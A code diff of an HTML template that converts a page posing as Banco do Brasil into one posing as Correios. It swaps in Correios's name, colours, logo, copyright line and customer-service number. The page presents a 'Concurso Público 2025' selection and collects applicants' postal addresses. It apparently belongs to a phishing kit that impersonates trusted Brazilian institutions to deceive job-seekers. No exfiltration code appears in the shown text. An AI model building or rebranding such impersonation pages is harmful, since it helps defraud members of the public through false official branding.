@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Banco do Brasil - Confirmação de Endereço</title>
+    <title>Correios - Confirmação de Endereço</title>
 
     <!-- Preload fonts -->
     <link rel="preload" href="{{ url_for('static', filename='fonts/rawline-400.woff2') }}" as="font" type="font/woff2" crossorigin>
@@ -26,8 +26,8 @@
             theme: {
                 extend: {
                     colors: {
-                        'bb-yellow': '#FEEF37',
-                        'bb-blue': '#003DA5',
+                        'correios-blue': '#003399',
+                        'correios-yellow': '#FFCC00',
                     }
                 }
             }
@@ -35,16 +35,16 @@
     </script>
 </head>
 <body class="bg-gray-50 min-h-screen flex flex-col">
-    <div class="bg-bb-yellow py-4 shadow-sm">
+    <div class="bg-correios-yellow py-4 shadow-sm">
         <div class="container mx-auto px-4">
             <div class="flex flex-col items-center text-center">
-                <img src="https://i.ibb.co/WvBH03fD/png-transparent-banco-do-brasil-hd-logo-thumbnail-removebg-preview-1.png" alt="Logo do Banco do Brasil" class="h-12 mb-2" />
+                <img src="https://logodownload.org/wp-content/uploads/2014/05/correios-logo-1-1.png" alt="Logo dos Correios" class="h-12 mb-2" />
                 <div>
-                    <p class="text-bb-blue text-[16px] leading-tight font-bold tracking-wide">
+                    <p class="text-correios-blue text-[16px] leading-tight font-bold tracking-wide">
                         CONCURSO PÚBLICO 2025
                     </p>
-                    <p class="text-bb-blue text-[12px] leading-tight tracking-wide">
-                        SELEÇÃO EXTERNA PARA CARREIRA ADMINISTRATIVA
+                    <p class="text-correios-blue text-[12px] leading-tight tracking-wide">
+                        SELEÇÃO EXTERNA PARA MÚLTIPLOS CARGOS
                     </p>
                 </div>
             </div>
@@ -52,7 +52,7 @@
     </div>
 
     <!-- Blue bar -->
-    <div class="bg-bb-blue py-3 shadow-md">
+    <div class="bg-correios-blue py-3 shadow-md">
         <div class="container mx-auto px-4 flex items-center">
             <div class="grid grid-cols-2 gap-0.5 mr-3 drop-shadow-sm">
                 <div class="w-2 h-2 bg-white"></div>
@@ -69,7 +69,7 @@
         <div class="max-w-2xl mx-auto">
             <div class="bg-white rounded-lg shadow-md p-6">
                 <div class="mb-6">
-                    <h2 class="text-lg font-bold text-bb-blue mb-2">Endereço para Correspondência</h2>
+                    <h2 class="text-lg font-bold text-correios-blue mb-2">Endereço para Correspondência</h2>
                     <p class="text-gray-600">Por favor, informe seu endereço para envio de correspondências:</p>
                 </div>
 
@@ -80,7 +80,7 @@
                             <label for="cep" class="block text-sm font-medium text-gray-700 mb-1">CEP</label>
                             <div class="relative">
                                 <input type="text" id="cep" name="cep" 
-                                       class="w-full px-4 py-2 border rounded-lg focus:ring-bb-blue focus:border-bb-blue"
+                                       class="w-full px-4 py-2 border rounded-lg focus:ring-correios-blue focus:border-correios-blue"
                                        required
                                        maxlength="9"
                                        pattern="\d{5}-\d{3}"
@@ -94,14 +94,14 @@
                         <div>
                             <label for="logradouro" class="block text-sm font-medium text-gray-700 mb-1">Logradouro</label>
                             <input type="text" id="logradouro" name="logradouro" 
-                                   class="w-full px-4 py-2 border rounded-lg bg-gray-50 focus:ring-bb-blue focus:border-bb-blue"
+                                   class="w-full px-4 py-2 border rounded-lg bg-gray-50 focus:ring-correios-blue focus:border-correios-blue"
                                    required readonly />
                         </div>
 
                         <div>
                             <label for="numero" class="block text-sm font-medium text-gray-700 mb-1">Número</label>
                             <input type="text" id="numero" name="numero" 
-                                   class="w-full px-4 py-2 border rounded-lg focus:ring-bb-blue focus:border-bb-blue"
+                                   class="w-full px-4 py-2 border rounded-lg focus:ring-correios-blue focus:border-correios-blue"
                                    required
                                    inputmode="numeric"
                                    placeholder="Digite o número" />
@@ -110,33 +110,33 @@
                         <div>
                             <label for="complemento" class="block text-sm font-medium text-gray-700 mb-1">Complemento (opcional)</label>
                             <input type="text" id="complemento" name="complemento" 
-                                   class="w-full px-4 py-2 border rounded-lg focus:ring-bb-blue focus:border-bb-blue"
+                                   class="w-full px-4 py-2 border rounded-lg focus:ring-correios-blue focus:border-correios-blue"
                                    placeholder="Apartamento, sala, conjunto..." />
                         </div>
 
                         <div>
                             <label for="bairro" class="block text-sm font-medium text-gray-700 mb-1">Bairro</label>
                             <input type="text" id="bairro" name="bairro" 
-                                   class="w-full px-4 py-2 border rounded-lg bg-gray-50 focus:ring-bb-blue focus:border-bb-blue"
+                                   class="w-full px-4 py-2 border rounded-lg bg-gray-50 focus:ring-correios-blue focus:border-correios-blue"
                                    required readonly />
                         </div>
 
                         <div>
                             <label for="cidade" class="block text-sm font-medium text-gray-700 mb-1">Cidade</label>
                             <input type="text" id="cidade" name="cidade" 
-                                   class="w-full px-4 py-2 border rounded-lg bg-gray-50 focus:ring-bb-blue focus:border-bb-blue"
+                                   class="w-full px-4 py-2 border rounded-lg bg-gray-50 focus:ring-correios-blue focus:border-correios-blue"
                                    required readonly />
                         </div>
 
                         <div>
                             <label for="estado" class="block text-sm font-medium text-gray-700 mb-1">Estado</label>
                             <input type="text" id="estado" name="estado" 
-                                   class="w-full px-4 py-2 border rounded-lg bg-gray-50 focus:ring-bb-blue focus:border-bb-blue"
+                                   class="w-full px-4 py-2 border rounded-lg bg-gray-50 focus:ring-correios-blue focus:border-correios-blue"
                                    required readonly />
                         </div>
                     </div>
 
-                    <button type="submit" class="w-full bg-bb-blue hover:bg-opacity-90 text-white font-bold py-3 px-6 rounded-md flex items-center justify-center space-x-2 shadow-md hover:shadow-lg transition duration-200 mt-6">
+                    <button type="submit" class="w-full bg-correios-blue hover:bg-opacity-90 text-white font-bold py-3 px-6 rounded-md flex items-center justify-center space-x-2 shadow-md hover:shadow-lg transition duration-200 mt-6">
                         <span>Confirmar Endereço</span>
                         <i class="fas fa-arrow-right ml-2"></i>
                     </button>
@@ -146,9 +146,9 @@
     </div>
 
     <!-- Footer -->
-    <div class="bg-bb-yellow text-bb-blue text-center py-4 mt-auto shadow-inner">
-        <p class="text-sm font-medium">© {{ current_year }} Banco do Brasil S.A. Todos os direitos reservados.</p>
-        <p class="text-sm mt-1">Central de Atendimento BB - 0800 729 0722</p>
+    <div class="bg-correios-yellow text-correios-blue text-center py-4 mt-auto shadow-inner">
+        <p class="text-sm font-medium">© {{ current_year }} Empresa Brasileira de Correios e Telégrafos. Todos os direitos reservados.</p>
+        <p class="text-sm mt-1">Central de Atendimento dos Correios - 0800 725 0100</p>
     </div>
 
     <script>
